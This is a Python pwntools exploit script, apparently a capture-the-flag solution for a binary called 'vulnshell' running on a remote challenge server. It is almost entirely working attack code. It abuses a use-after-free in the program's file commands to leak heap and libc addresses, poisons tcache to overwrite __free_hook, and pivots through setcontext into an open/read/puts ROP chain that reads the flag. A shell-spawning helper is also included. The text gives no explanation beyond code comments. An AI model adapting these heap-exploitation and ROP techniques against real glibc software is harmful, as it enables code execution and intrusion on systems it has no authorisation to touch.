# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './vulnshell'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'test.node1.edisec.net'
    port = '31353'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('# ',num)

def ls():
    cmd('ls')

def touch( filename ):
    cmd('touch %s'%filename)

def vi( filename , content ):
    cmd('vi %s'%filename)
    sa('Data: ' , content)

def cat( filename ):
    cmd( 'cat %s'%filename )

def rm( filename ):
    cmd( 'rm %s'%filename )

def cp( filename1 , filename2 ):
    cmd( 'cp ' + str(filename1) + ' ' + str(filename2) )

# one_gad = one_gadget(libc.path)

def attack():
    
    touch('0')
    touch('1')
    vi('0' , 'b'*0x108)
    vi('1' , 'b'*0x108)
    cp('0' , '2')

    rm('1')
    rm('0')
    cat('2')
    heap_base = u64(p.recv(6).ljust(8 , '\x00')) - 0x450
    lg('heap_base' , heap_base)

    vi(2 , p64(heap_base + 0x10))
    
    touch('3')
    touch('4')
    vi('3' , 'b'*0x108)
    vi('4' , ( p64(0)*0x8 + p16(0x7)*0x18).ljust(0x108 ,'\x00'))

    cp('4' , '5')
    rm('4')
    cat('5')

    __malloc_hook = l64() - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    setcontext = libc.sym['setcontext'] + 61
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()

    fake_tcache = flat(
        p16(1)*0x40 , heap_base + 0x300,
        p64(__free_hook )*8
    )

    vi('5' , fake_tcache)
    touch( 'a'*8 + p64( heap_base + 0x308 ) )

    # 下面 2.31 标准开启 orw

    magic = 0x154930 + libc.address
    
    # <getkeyserv_handle+576>:	mov    rdx,QWORD PTR [rdi+0x8]
    # <getkeyserv_handle+580>:	mov    QWORD PTR [rsp],rax
    # <getkeyserv_handle+584>:	call   QWORD PTR [rdx+0x20]
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    ret = libc.search(asm('ret')).next()
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r13 ; pop r15 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ;pop rbx; ret')).next()

    flag_addr = __free_hook + 0x8 
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_r13_pop_r15_ret , 0 , heap_base + 0x330 , pop_rdi_ret + 1 ,
        pop_rdi_ret , flag_addr , puts_addr
    ) 
    # len chain 0x80

    # payload =p64(ret)*0xc + chain
    
    vi('a'*8 + p64( heap_base + 0x308 ) , flat( magic , 'flag'))

    payload = p64(setcontext)*0x2 +  chain
    vi('3' , payload)

    # dbg('free')
    rm('a'*8 + p64( heap_base + 0x308 ))
    # dbg('free')



    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   vulnshell.py
@Time    :   2021/10/31 17:02:52
@Author  :   Niyah 
'''